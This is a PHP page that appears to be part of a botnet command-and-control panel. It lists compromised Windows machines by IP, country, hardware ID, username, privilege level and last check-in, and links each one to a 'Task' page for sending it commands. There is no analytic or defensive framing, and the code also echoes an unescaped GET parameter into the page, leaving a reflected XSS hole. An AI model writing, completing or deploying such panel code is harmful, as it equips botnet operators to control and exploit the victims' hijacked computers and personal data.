<?php
	$i_SelectedPage = (is_numeric($_GET["i"]) ? (int)$_GET["i"] : 1);
	$countofBots = GetCountofBots();
?>

<!DOCTYPE html>
<html>
	<head>
		<link rel="stylesheet" type="text/css" href="./css/bots.css">
	</head>
	
	<body>
		<div class="bots-container">
			<div class="bots-content">
				<div class="bots-content-title">
					Fliter
				</div>
				
				<div class="bots-listview-container">
					<form method="GET">
						<table>
							<tr>
								<td>
									Pattern:
								</td>
								<td>
									<?php
										$s_Filter = $_GET["filter"];
										echo "<input class=\"bots-pattern-textbox\" type=\"text\" name=\"filter\" value=\"$s_Filter\">";
									?>
								</td>
							</tr>
							<tr>
								<td></td>
								<td>
									<input class="kostil" type="text" name="pg" value="bs">
									<input class="bots-pattern-button" type="submit" value="Install">
								</td>
							</tr>
						</table>
					</form>
				</div>
			</div>
			
			<div class="bots-content">
				<div class="bots-content-title">
					Bots
				</div>
				
				<div class="bots-listview-container">
					<table class="bots-listview">
						<th>
							IP
						</th>
						<th>
							Country
						</th>
						<th>
							Hwid
						</th>
						<th>
							Windows
						</th>
						<th>
							Username
						</th>
						<th>
							Arch.
						</th>
						<th>
							Rights
						</th>
						<th>
							Status
						</th>
						<th>
							Last Seen
						</th>
						<th>
							Action
						</th>
						<?php
							$a_Data = GetBotList($i_SelectedPage - 1);
							$b_SomeAdded = false;
							foreach ($a_Data as $row)
							{
								$s_Ip = htmlentities($row["ip"]);
								$s_Country = htmlentities($row["country"]);
								$s_Hwid = htmlentities($row["hwid"]);
								$s_Windows = htmlentities($row["windows"]);
								$s_Username = htmlentities($row["username"]);
								$s_Arch = htmlentities($row["arch"]);
								$s_Rights = htmlentities($row["rights"]);
								$s_Status = htmlentities($row["status"]);
								$s_Knock = CalcTime($row["lseen"], true);
								
								echo "<tr>
									<td>$s_Ip</td>
									<td>$s_Country</td>
									<td>$s_Hwid</td>
									<td>$s_Windows</td>
									<td>$s_Username</td>
									<td>$s_Arch</td>
									<td>$s_Rights</td>
									<td class=\"$s_Status\">$s_Status</td>
									<td>$s_Knock</td>
									<td>
										<a class=\"task-link\" href=\"?pg=cs&bid=$s_Hwid\">Task</a>
									</td>
								</tr>";
								$b_SomeAdded = true;
							}
							
							if(!$b_SomeAdded)
								echo "<tr><th class=\"nempty\" colspan=\"10\">~ Empty ~</th></tr>";
						?>
					</table>
				</div>
				
				<div class="bots-page-selector">
					<?php
						$i_MaxPages = ceil($countofBots / 25);
						$currentURI = str_replace("&i=$i_SelectedPage", "", $_SERVER["REQUEST_URI"]);
						$larrow = 1;
						if($i_SelectedPage - 1 > 0)
							$larrow = $i_SelectedPage - 1;
						
						echo "<a href=\"$currentURI&i=$larrow\">&lt;</a>";
						
						echo CreateLinks($i_MaxPages, $i_SelectedPage, 1, $currentURI);
						
						$rarrow = $i_MaxPages;
						if($i_SelectedPage + 1 < $i_MaxPages)
							$rarrow = $i_SelectedPage + 1;
						else if($i_MaxPages == 0)
							$rarrow = $i_SelectedPage;
						
						echo "<a href=\"$currentURI&i=$rarrow\">&gt;</a>";
					?>
				</div>
			</div>
		</div>
	</body>
</html>